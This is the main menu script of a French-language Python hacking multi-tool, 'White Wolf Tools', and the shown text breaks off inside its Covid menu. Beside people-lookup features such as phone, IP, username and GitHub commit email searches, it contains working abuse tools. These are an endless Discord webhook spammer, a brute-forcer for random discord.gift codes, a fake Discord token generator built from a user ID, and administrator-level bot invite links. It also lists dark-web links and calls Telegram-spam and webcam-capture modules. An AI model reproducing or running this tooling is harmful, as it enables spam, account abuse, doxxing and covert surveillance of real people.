import os
import time
import requests
import webbrowser
import json
import msvcrt
import tempfile
import subprocess
from pypresence import Presence
import random
import string
import base64
from api import api_ip, api_number, api_dns
from sites import sites
from darkweb import links
from pynput import keyboard
import threading
import io
import mss
import mss.tools
import whois
import os
import subprocess
from tkinter import Tk, filedialog
from code.discordchecker import main
from code.tiktokchecker import tiktok
from code.githubchecker import git
from builder import builder
from code.genip import ip
from code.Spamtlgrm import tlgrm
from code.passwordmanager import passwdmanage
from code.challange.firstchallange import osint
from code.challange.pentestchallange import main
from code.ipscanner import ip
from code.letsenscript import domaine
from code.robloxsearch import roblox

from code.ai import ai
from code.checking import holehe
from code.rpc import rpc_conf
from code.webcamcapt import webcam
from pyfiglet import Figlet
from code.tokencheck import tokenchecker
from code.embedsender import sender
from code.colors import *

 

def rpc():
    rpc = Presence("1441226984024965221")
    rpc.connect()

    rpc.update(
        state="White Wolf",
        details="Best Tools",
        large_image="tools",
        large_text="by xql",
        buttons=[
            {"label": "Repository", "url": "https://github.com/Python-loving/WHITEWOLF-TOOLS"},
            {"label": "Telegram", "url": "https://t.me/whitewolf_tools"}
        ]
    )

    while True:
        time.sleep(15)

def devtools():
    os.system("cls")
    choix = input(f"""{MAGENTA}
    ████▄  ██████ ██  ██ ██████ ▄████▄ ▄████▄ ██     ▄█████ 
    ██  ██ ██▄▄   ██▄▄██   ██   ██  ██ ██  ██ ██     ▀▀▀▄▄▄ 
    ████▀  ██▄▄▄▄  ▀██▀    ██   ▀████▀ ▀████▀ ██████ █████▀ 
                                                        
    Devtools for xql : """)
    f = Figlet(font="slant")
    print(f.renderText(choix))

# Just for xql ( devtools() )

# ANCHOR - Command thread 
threading.Thread(target=rpc, daemon=True).start()

def show_informations():
    os.system("cls")
    print(f"""{RED} Informations {RED}
            Telegram - https://t.me/whitewolf_tools
            Gunslol - https://guns.lol/xqldev
        """)
    time.sleep(5)

while True:
    os.system("cls")
    choix = input(f""" {WHITE}
            ██╗    ██╗██╗  ██╗██╗████████╗███████╗██╗    ██╗ ██████╗ ██╗     ███████╗
            ██║    ██║██║  ██║██║╚══██╔══╝██╔════╝██║    ██║██╔═══██╗██║     ██╔════╝
            ██║ █╗ ██║███████║██║   ██║   █████╗  ██║ █╗ ██║██║   ██║██║     █████╗  
            ██║███╗██║██╔══██║██║   ██║   ██╔══╝  ██║███╗██║██║   ██║██║     ██╔══╝  
            ╚███╔███╔╝██║  ██║██║   ██║   ███████╗╚███╔███╔╝╚██████╔╝███████╗██║     
             ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝     
        [I]. Informations                                      

            1. [Lookup]    4. [Covid]
            2. [Sécurity]  5. [Quit]
            3. [Discord]

            Fais ton choix : """).lower()
        
    if  choix == "1":
        os.system("cls")
        choix2 = input(f""" {WHITE}
                            ██╗      ██████╗  ██████╗ ██╗  ██╗██╗   ██╗██████╗ 
                            ██║     ██╔═══██╗██╔═══██╗██║ ██╔╝██║   ██║██╔══██╗
                            ██║     ██║   ██║██║   ██║█████╔╝ ██║   ██║██████╔╝
                            ██║     ██║   ██║██║   ██║██╔═██╗ ██║   ██║██╔═══╝ 
                            ███████╗╚██████╔╝╚██████╔╝██║  ██╗╚██████╔╝██║     
                            ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     
                    [I]. Informations                                      

                            1. [IP]          4. [Google]      7. [Github]      10. [4C Tiktok]  13. [IP Scanner]   16. [AI]
                            2. [Number]      5. [Dns]         8. [Leak Mail]   11. [4C Github]  14. [SSL / TLS]    17. [Holehe]
                            3. [Username]    6. [DISCORD]     9. [Archive Web] 12. [Github]     15. [Roblox]       18. [Quit]

                            Fais ton choix : """).lower()
        if choix2 == "1":
            os.system("cls")
            choixip = input("""
                    ██╗██████╗ 
                    ██║██╔══██╗
                    ██║██████╔╝
                    ██║██╔═══╝ 
                    ██║██║     
                    ╚═╝╚═╝     

        Choisis L'ip Que tu veux lookup : """)
            try:
                myreq = requests.get(f"https://geo.ipify.org/api/v2/country,city,vpn?apiKey={api_ip}&ipAddress={choixip}")
                data = myreq.json()
                print(f"IP: {data['ip']}")
                print(f"Pays: {data['location']['country']}")
                print(f"Ville: {data['location']['city']}")
                print(f"ISP: {data['isp']}")
                time.sleep(2)
                print("Vous allez ètre ramener a l'accueil")
                time.sleep(2)
                os.system("cls")
            except Exception as e:
                print(f"Error {e}")
        # Ici je mais mon deuxième choçix donc Lookup Number
        elif choix2 == "2":
            os.system("cls")
            choixnumber = input("""
            ███╗   ██╗██╗   ██╗███╗   ███╗██████╗ ███████╗██████╗ 
            ████╗  ██║██║   ██║████╗ ████║██╔══██╗██╔════╝██╔══██╗
            ██╔██╗ ██║██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
            ██║╚██╗██║██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
            ██║ ╚████║╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
            ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝

        Choisis Le numéro de téléphone que tu veux lookup : """)
            try:
                myreq2 = requests.get(f"http://apilayer.net/api/validate?access_key={api_number}&number={choixnumber}")
                data2 = myreq2.json()
                print(f"Country: {data2['country_name']}")
                print(f"Format: {data2['local_format']}")
                print(f"international_format: {data2['international_format']}")
                print(f"Carrier: {data2['carrier']}")
                time.sleep(2)
                print("")
                print("Retour A l'accueil dnas 2s")
                time.sleep(2)
            except Exception as e:
                print(f"Error {e}")
        elif choix2 == "3":
            os.system("cls")
            username = input("""
            ██╗   ██╗███████╗███████╗██████╗ ███╗   ██╗ █████╗ ███╗   ███╗███████╗
            ██║   ██║██╔════╝██╔════╝██╔══██╗████╗  ██║██╔══██╗████╗ ████║██╔════╝
            ██║   ██║███████╗█████╗  ██████╔╝██╔██╗ ██║███████║██╔████╔██║█████╗  
            ██║   ██║╚════██║██╔══╝  ██╔══██╗██║╚██╗██║██╔══██║██║╚██╔╝██║██╔══╝  
            ╚██████╔╝███████║███████╗██║  ██║██║ ╚████║██║  ██║██║ ╚═╝ ██║███████╗
             ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝

            Choisis le username a lookup : """)
            sites = sites
            try:
                for site, url in sites.items():
                    full_url = url.format(username)
                    r = requests.get(full_url)
                    if r.status_code == 200:
                        print(f"Trouvé sur {site} : {full_url}")
                    else:
                        print(f"Rien Trouvé sur {site}")
            except Exception as e:
                print(f"Error {e}")
        elif choix2 == "4":
            os.system("cls")
            search_google = input("""
                 ██████╗  ██████╗  ██████╗  ██████╗ ██╗     ███████╗    ███████╗███████╗ █████╗ ██████╗  ██████╗██╗  ██╗
                ██╔════╝ ██╔═══██╗██╔═══██╗██╔════╝ ██║     ██╔════╝    ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║
                ██║  ███╗██║   ██║██║   ██║██║  ███╗██║     █████╗      ███████╗█████╗  ███████║██████╔╝██║     ███████║
                ██║   ██║██║   ██║██║   ██║██║   ██║██║     ██╔══╝      ╚════██║██╔══╝  ██╔══██║██╔══██╗██║     ██╔══██║
                ╚██████╔╝╚██████╔╝╚██████╔╝╚██████╔╝███████╗███████╗    ███████║███████╗██║  ██║██║  ██║╚██████╗██║  ██║
                 ╚═════╝  ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                     
                Fais ta recherche google : """)
            try:
                query = f"{search_google}"
                url = "https://www.google.com/search?q=" + query

                webbrowser.open(url)
            except Exception as e:
                print(f"Error {e}")
        # on definie le lookup des dns
        elif choix2 == "5":
            os.system("cls")
            dns = input("""
                ██████╗ ███╗   ██╗███████╗    ██╗      ██████╗  ██████╗ ██╗  ██╗██╗   ██╗██████╗ 
                ██╔══██╗████╗  ██║██╔════╝    ██║     ██╔═══██╗██╔═══██╗██║ ██╔╝██║   ██║██╔══██╗
                ██║  ██║██╔██╗ ██║███████╗    ██║     ██║   ██║██║   ██║█████╔╝ ██║   ██║██████╔╝
                ██║  ██║██║╚██╗██║╚════██║    ██║     ██║   ██║██║   ██║██╔═██╗ ██║   ██║██╔═══╝ 
                ██████╔╝██║ ╚████║███████║    ███████╗╚██████╔╝╚██████╔╝██║  ██╗╚██████╔╝██║     
                ╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     
                Choisis l'url du site que tu veux lookup : """)
            api = f"https://api.viewdns.info/abuselookup/?domain={dns}&apikey={api_dns}&output=json"
            
            response = requests.get(api)
            data = response.json()
            try:
                if response.ok:
                    print(f"Tool : {data['query']['tool']}")
                    print(f"Domaine : {data['query']['domain']}")
                    print(f"Abuse contact : {data['response']['abusecontact']}")
                    time.sleep(2)
                    print("")
                    print("Tu va ètre renvoyer a l'acueil dans 2s")
                    time.sleep(2)
                else:
                    print(f"Error: {response.status_code}, {response.text}")
                    time.sleep(2)
                    print("Tu va ètre renvoyer a l'acueil dans 2s")
                    time.sleep(2)
            except Exception as e:
                print(f"Error {e}")
        # Ici on crée le DISCORD LOOKUP
        # Help ai for lookup :)
        elif choix2 == "6":
            os.system("cls")
            lookup = input(f""" 
                        ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ 
                        ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
                        ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║
                        ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║
                        ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝
                        ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                        
                        Choisis L'id Du gars que tu veux lookup : """)

            url = f"https://api.vaultcord.com/webhooks/public-lookup/{lookup}"

            try:
                headers = {
                    "User-Agent": "Mozilla/5.0"
                }

                response = requests.get(url, headers=headers, timeout=10)

                if response.ok:
                    try:
                        data = response.json()
                        print(f"Id : {data.get('id')}")
                        print(f"Username : {data.get('username')}")
                        print(f"Avatar : {data.get('avatar')}")
                        print(f"Discriminator : {data.get('discriminator')}")
                        print(f"Public flags : {data.get('public_flags')}")
                        print(f"Flags : {data.get('flags')}")
                        print(f"Global name : {data.get('global_name')}")

                        time.sleep(7)
                    except ValueError:
                        print("La réponse n'est pas au format JSON :")
                        print(response.text)
                        time.sleep(3)

                else:
                    print(f"Erreur HTTP {response.status_code}")
                    print(response.text)
                    time.sleep(3)

            except requests.exceptions.RequestException as e:
                print(f"Erreur lors de la requête : {e}")

        elif choix2 == "7":
            os.system("cls")
            username = input("""
             ██████╗ ██╗████████╗██╗  ██╗██╗   ██╗██████╗ 
            ██╔════╝ ██║╚══██╔══╝██║  ██║██║   ██║██╔══██╗
            ██║  ███╗██║   ██║   ███████║██║   ██║██████╔╝
            ██║   ██║██║   ██║   ██╔══██║██║   ██║██╔══██╗
            ╚██████╔╝██║   ██║   ██║  ██║╚██████╔╝██████╔╝
             ╚═════╝ ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
                Le Username github : """)
            os.system("cls")
            nom_repo = input("""
             ██████╗ ██╗████████╗██╗  ██╗██╗   ██╗██████╗ 
            ██╔════╝ ██║╚══██╔══╝██║  ██║██║   ██║██╔══██╗
            ██║  ███╗██║   ██║   ███████║██║   ██║██████╔╝https://www.youtube.com/
            ██║   ██║██║   ██║   ██╔══██║██║   ██║██╔══██╗
            ╚██████╔╝██║   ██║   ██║  ██║╚██████╔╝██████╔╝
             ╚═════╝ ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
                Le nom du repo : """)

            url = f"https://api.github.com/repos/{username}/{nom_repo}/commits?per_page=1"
            response = requests.get(url)
            data = response.json()
            try:
                if response.ok:
                    commit_data = data[0]

                    print(f"Email : {commit_data['commit']['author']['email']}")
                    print(f"Name  : {commit_data['commit']['author']['name']}")
                    print(f"date  : {commit_data['commit']['author']['date']}")
                    print(f"Msg   : {commit_data['commit']['message']}")
                    print(f"url   : {commit_data['html_url']}")
                    print(f"sign  : {commit_data['commit']['verification']['signature']}")
                    print(f"id    : {commit_data['sha']}")
                    print(f"PDP   : {commit_data['author']['avatar_url']}")
                    print(f"ABO   : {commit_data['author']['followers_url']}")
                    print(f"Node  : {commit_data['node_id']}")

                    time.sleep(5)
                elif not response.ok:
                    print(response.status_code)
                    time.sleep(5)
            except Exception as e:
                print(f"Error {e}")
        # API Haveibeen pwned alt
        elif choix2 == "8":
            os.system("cls")
            choix_mail = input("""
                ██╗     ███████╗ █████╗ ██╗  ██╗
                ██║     ██╔════╝██╔══██╗██║ ██╔╝
                ██║     █████╗  ███████║█████╔╝ 
                ██║     ██╔══╝  ██╔══██║██╔═██╗ 
                ███████╗███████╗██║  ██║██║  ██╗
                ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
                Choisis Le mail que tu veux verifié : """)
            url = f"https://leakcheck.io/api/public?check={choix_mail}"
            response = requests.get(url)
            data = response.json()
            try:
                if response.ok:
                    print("Tout les données sont dasn result.json")
                    time.sleep(5)
                    with open("result.json", "w", encoding="utf-8") as fichier:
                        json.dump(data, fichier, ensure_ascii=False, indent=4)
                else:
                    print("Aucun Resultas ou bug", response.status_codes)
                    time.sleep(5)
            except Exception as e:
                print(f"Error {e}")
        
        elif choix2 == "9":
            os.system("cls")
            choix_url = input(f""" {YELLOW}
                     █████╗ ██████╗  ██████╗██╗  ██╗██╗██╗   ██╗███████╗
                    ██╔══██╗██╔══██╗██╔════╝██║  ██║██║██║   ██║██╔════╝
                    ███████║██████╔╝██║     ███████║██║██║   ██║█████╗  
                    ██╔══██║██╔══██╗██║     ██╔══██║██║╚██╗ ██╔╝██╔══╝  
                    ██║  ██║██║  ██║╚██████╗██║  ██║██║ ╚████╔╝ ███████╗
                    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝
                    
                    Met le lien de ton site : """)
            try:
                url_du_site = choix_url
                api_url = f"https://archive.org/wayback/available?url={url_du_site}"
                response = requests.get(api_url)
                data = response.json()

                if response.ok:
                    print(f"Status : {data['archived_snapshots']['closest']['status']}")
                    print(f"Disponible : {data['archived_snapshots']['closest']['available']}")
                    print(f"Archive : {data['archived_snapshots']['closest']['url']}")
                    print(f"Timestamp : {data['archived_snapshots']['closest']['timestamp']}")
                    time.sleep(5)
                else:
                    print("Une erreur et survenue")
                    time.sleep(3)
            except Exception as e:
                print(f"Error {e}")
                time.sleep(3)
        elif choix2 == "10":
            tiktok()
        
        elif choix2 == "11":
            git()
        
        elif choix2 == "12":
            main()

        elif choix2 == "13":
            ip()
        
        elif choix2 == "14":
            domaine()

        elif choix2 == "15":
            roblox()

        elif choix2 == "16":
            ai()

        elif choix2 == "17":
            holehe()

        elif choix2 == "i":
            show_informations()

        elif choix2 == "18":
            print("Tu va quitté le tools")
            time.sleep(2)
            print("Au-Revoir :)")
            time.sleep(2)
            break

    # Menu sécurity
    elif choix == "2":
        os.system("cls")
        choix3 = input(f""" {WHITE}
        ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
        ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
        ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
        ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
        ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
        ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
    [I]. Informations    
        1. [PROXY(VPN)]     4. [Scraper] 7. [Spam Telegram]  10. [Pentest Web]
        2. [Gen Password]   5. [Whois]   8. [Passwd Manager] 11. [Webcam]
        3. [Status Website] 6. [Gen IP]  9. [Osint]          12. [Quit]
            {WHITE}
        Fais ton choix : """).lower()

        if choix3 == "1":
            os.system("cls")
            # Plupart du code VPN A etais generer par CHATGPT :)
            vpn = input("""
            ██╗   ██╗██████╗ ███╗   ██╗
            ██║   ██║██╔══██╗████╗  ██║
            ██║   ██║██████╔╝██╔██╗ ██║
            ╚██╗ ██╔╝██╔═══╝ ██║╚██╗██║
             ╚████╔╝ ██║     ██║ ╚████║
              ╚═══╝  ╚═╝     ╚═╝  ╚═══╝

            Choisis Le temps que tu a besoin : """)
            os.system("cls")
            prx = input("""
            ██╗   ██╗██████╗ ███╗   ██╗
            ██║   ██║██╔══██╗████╗  ██║
            ██║   ██║██████╔╝██╔██╗ ██║
            ╚██╗ ██╔╝██╔═══╝ ██║╚██╗██║
             ╚████╔╝ ██║     ██║ ╚████║
              ╚═══╝  ╚═╝     ╚═╝  ╚═══╝

            Choisis Le Proxy que tu veux : """)

            try:
                vpn = int(vpn)

                proxy = prx

                proxies = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }

                try:
                    r = requests.get(
                        "https://api.ipify.org?format=json",
                        proxies=proxies,
                        timeout=5
                    )
                    print("Proxy OK :", r.json())
                except:
                    print("Proxy invalide ou mort")
                    exit()

                os.system("taskkill /F /IM msedge.exe >nul 2>&1")

                if vpn >= 10:
                    edge_path = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
                    profile_dir = tempfile.mkdtemp()

                    subprocess.Popen([
                        edge_path,
                        f"--proxy-server=http://{proxy}",
                        f"--user-data-dir={profile_dir}",
                        "--new-window",
                        "https://api.ipify.org"
                    ])

                    print("\nVPN actif... appuie sur une touche pour arrêter\n")

                    start = time.time()
                    # Help ai for press & retour
                    while True:
                        if msvcrt.kbhit():
                            msvcrt.getch()
                            print("Arrêt demandé retour menu")
                            os.system("taskkill /F /IM msedge.exe >nul 2>&1")
                            break

                        if time.time() - start >= vpn:
                            print("Temps terminé")
                            os.system("taskkill /F /IM msedge.exe >nul 2>&1")
                            break

                        time.sleep(0.1)

                else:
                    print("Minimum 10 secondes")

            except ValueError:
                print("Entrer un nombre valide")
        
        elif choix3 == "2":
            os.system("cls")
            try:
                password = input("""
                ██████╗  █████╗ ███████╗███████╗██╗    ██╗ ██████╗ ██████╗ ██████╗ 
                ██╔══██╗██╔══██╗██╔════╝██╔════╝██║    ██║██╔═══██╗██╔══██╗██╔══██╗
                ██████╔╝███████║███████╗███████╗██║ █╗ ██║██║   ██║██████╔╝██║  ██║
                ██╔═══╝ ██╔══██║╚════██║╚════██║██║███╗██║██║   ██║██╔══██╗██║  ██║
                ██║     ██║  ██║███████║███████║╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝
                ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ 

                Choisis le nombre de lettre & Chifre : """)
            except ValueError as e:
                print(f"Choisis un nombre valide {e}")

            try:
                password = int(password)

                if password >= 10:
                    chars = string.ascii_letters + string.digits + string.punctuation

                    result = ''.join(random.choice(chars) for _ in range(password))

                    print("Password :", result)
                    time.sleep(5)
                else:
                    print("Min 10 char")
                    time.sleep(5)
                    
            except Exception as e:
                print(f"Error {e}")
                time.sleep(5)
        elif choix3 == "3":
            os.system("cls")
            try:
                site = input("""
                    ██╗    ██╗███████╗██████╗     ███████╗████████╗ █████╗ ████████╗██╗   ██╗███████╗
                    ██║    ██║██╔════╝██╔══██╗    ██╔════╝╚══██╔══╝██╔══██╗╚══██╔══╝██║   ██║██╔════╝
                    ██║ █╗ ██║█████╗  ██████╔╝    ███████╗   ██║   ███████║   ██║   ██║   ██║███████╗
                    ██║███╗██║██╔══╝  ██╔══██╗    ╚════██║   ██║   ██╔══██║   ██║   ██║   ██║╚════██║
                    ╚███╔███╔╝███████╗██████╔╝    ███████║   ██║   ██║  ██║   ██║   ╚██████╔╝███████║
                    ╚══╝╚══╝ ╚══════╝╚═════╝     ╚══════╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚══════╝
                    
                    Choisis l'url du site que tu veux check : """)
            except ValueError as e:
                print(f"Error {e}")
                
            url = site
            response = requests.get(url)
            try:
                if response.ok:
                    print(f"Le site a répondu en : {response.elapsed.total_seconds() * 1000:.2f} ms")
                    time.sleep(3)
                else:
                    print("Le site na pas répondu présents")
                    time.sleep(3)
            except Exception as e:
                print(f"Error {e}")

        elif choix3 == "4":
            os.system("cls")
            page = input("""
                ███████╗ ██████╗██████╗  █████╗ ██████╗ ███████╗██████╗ 
                ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
                ███████╗██║     ██████╔╝███████║██████╔╝█████╗  ██████╔╝
                ╚════██║██║     ██╔══██╗██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
                ███████║╚██████╗██║  ██║██║  ██║██║     ███████╗██║  ██║
                ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                    
                Met le lien du site : """)
            
            response = requests.head(page)

            try:
                if response.ok:
                    print("header du site :\n")
                    with open("result.txt", "w", encoding="utf-8") as fichier:
                        for key, value in response.headers.items():
                            print(f"{key} : {value}")
                            fichier.write(f"{key}, ; {value}\n")
                    time.sleep(5)
                else:
                    print("Ca marche pas")
            except ValueError:
                print("Error input")
        
        elif choix3 == "5":
            try:
                whois = input(f""" {RED}
                    ██╗    ██╗██╗  ██╗ ██████╗ ██╗███████╗
                    ██║    ██║██║  ██║██╔═══██╗██║██╔════╝
                    ██║ █╗ ██║███████║██║   ██║██║███████╗
                    ██║███╗██║██╔══██║██║   ██║██║╚════██║
                    ╚███╔███╔╝██║  ██║╚██████╔╝██║███████║
                    ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚══════╝
                    
                    Met le lien de ton site : """)
            except ValueError as e:
                print(f"Error {e}")
            
            try:
                data = whois.whois(whois)
                print(f"Domaine : {data.domain_name}")
                print(f"Registrar : {data.registrar}")
                print(f"Création : {data.creation_date}")
                print(f"Expiration : {data.expiration_date}")
                print(f"DNS : {data.name_servers}")
            except Exception as e:
                print(f"Error {e}")
        elif choix3 == "6":
            ip()

        elif choix3 == "7":
            tlgrm()
        
        elif choix3 == "8":
            passwdmanage()

        elif choix3 == "9":
            osint()

        elif choix3 == "10":
            main()
        
        elif choix3 == "11":
            webcam()

        elif choix3 == "i":
            show_informations()

        elif choix3 == "12":
            print("Au-Revoir a bientot l'amis")
            time.sleep(2)
            break
    # catgegories
    elif choix == "3":
        os.system("cls")
        discord = input(f""" {WHITE}
            ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ 
            ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
            ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║
            ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║
            ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝
            ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
        [I]. Informations               

            1. [Nitro Gen]       4. [Token BruteForce]  7. [rpc_conf]   10. [Quit]
            2. [Spaming Webhook] 5. [Bot to id]         8. [Token check]
            3. [Darkweb]         6. [4c Checker]        9. [Webhook sender]
                {WHITE}
            Choisis : """).lower()

        # Nitro gen
        if discord == "1":
            os.system("cls")
            nombre = input("""
                ███╗   ██╗██╗████████╗██████╗  ██████╗ 
                ████╗  ██║██║╚══██╔══╝██╔══██╗██╔═══██╗
                ██╔██╗ ██║██║   ██║   ██████╔╝██║   ██║
                ██║╚██╗██║██║   ██║   ██╔══██╗██║   ██║
                ██║ ╚████║██║   ██║   ██║  ██║╚██████╔╝
                ╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ 
                Met le nombre de fois que tu veux essayé : """)
            try:
                nombre = int(nombre)
                for i in range(nombre):
                    char = string.ascii_letters + string.digits
                    result = ''.join(random.choice(char) for _ in range(16))
                    response = requests.get(f"https://discord.gift/{result}")

                    if response.ok:
                        with open("nitro.txt", "a", encoding="utf-8") as fichier:
                            fichier.write(f"https://discord.gift/{result}\n")
            except:
                print("Ca Nas pas marché sorry :)")
        # Webhook
        elif discord == "2":
            os.system("cls")
            message = input("""
                ██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗
                ██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝
                ██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝ 
                ██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗ 
                ╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗
                ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                
                Choisis Le message a spam : """)
            os.system("cls")
            url = input("""
                ██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗
                ██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝
                ██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝ 
                ██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗ 
                ╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗
                ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                
                Choisis L'url  : """)
            
            response = requests.get(url) 

            if response.ok:
                try:
                    while True:
                        data = {"content": message}
                        r = requests.post(url, json=data)
                        print(r.status_code, r.text)
                        time.sleep(5)
                except Exception as e:
                    print("Ca nas pas marché", e)
                    time.sleep(5)
        elif discord == "3":
            os.system("cls")
            print("""
                ██████╗  █████╗ ██████╗ ██╗  ██╗    ██╗    ██╗███████╗██████╗ 
                ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██║    ██║██╔════╝██╔══██╗
                ██║  ██║███████║██████╔╝█████╔╝     ██║ █╗ ██║█████╗  ██████╔╝
                ██║  ██║██╔══██║██╔══██╗██╔═██╗     ██║███╗██║██╔══╝  ██╔══██╗
                ██████╔╝██║  ██║██║  ██║██║  ██╗    ╚███╔███╔╝███████╗██████╔╝
                ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚══════╝╚═════╝  
                """)
            try:
                for category, content in links.items():
                    print(f"\n--- {category} ---")

                    for name, url in content.items():

                        if isinstance(url, dict):
                            print(f"\n  [{name}]")
                            for sub_name, sub_url in url.items():
                                print(f"   - {sub_name} : {sub_url}")
                        else:
                            print(f"  - {name} : {url}")
            except Exception as e:
                print(f"Error {e}")

            time.sleep(10)
        elif discord == "4":
            os.system("cls")
            id = input("""
                ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗
                ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║
                   ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║
                   ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║
                   ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║
                   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
                    
                    Met L'id du gars : """)
            try:
                user_id = id

                part1 = base64.b64encode(user_id.encode()).decode()
                part2 = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
                part3 = ''.join(random.choices(string.ascii_letters + string.digits, k=18))
                
                token = f"{part1}.{part2}.{part3}"
                
                print(f"\nToken : \n {token}")
                time.sleep(2)
            except:
                print("Ca na pas marché")
                time.sleep(2)
        elif discord == "5":
            os.system("cls")
            id_bot = int(input("""
                ██╗███╗   ██╗██╗   ██╗██╗████████╗
                ██║████╗  ██║██║   ██║██║╚══██╔══╝
                ██║██╔██╗ ██║██║   ██║██║   ██║   
                ██║██║╚██╗██║╚██╗ ██╔╝██║   ██║   
                ██║██║ ╚████║ ╚████╔╝ ██║   ██║   
                ╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚═╝   ╚═╝

                Met L'id de ton bot : """))

            try:
                id = id_bot
                print(f"https://discord.com/oauth2/authorize?client_id={id}&permissions=8&integration_type=0&scope=bot")
                time.sleep(5)
           
            except ValueError:
                print("Problème...")
                time.sleep(5)
        elif discord == "6":
            main()
            
        elif discord == "7":
            rpc_conf()
        
        elif discord == "8":
            tokenchecker()
        
        elif discord == "9":
            sender()
        
        elif discord == "i":
            show_informations()

        elif discord == "10":
            print("Aurevoir l'amis")
            time.sleep(2)
            break
            
    elif choix == "4":
        try:
            os.system("cls")
            covid = input(f""" {WHITE}
                 ██████╗ ██████╗ ██╗   ██╗██╗██████╗      ██╗ █████╗ 
                ██╔════╝██╔═══██╗██║   ██║██║██╔══██╗    ███║██╔══██╗
                ██║     ██║   ██║██║   ██║██║██║  ██║    ╚██║╚██████║
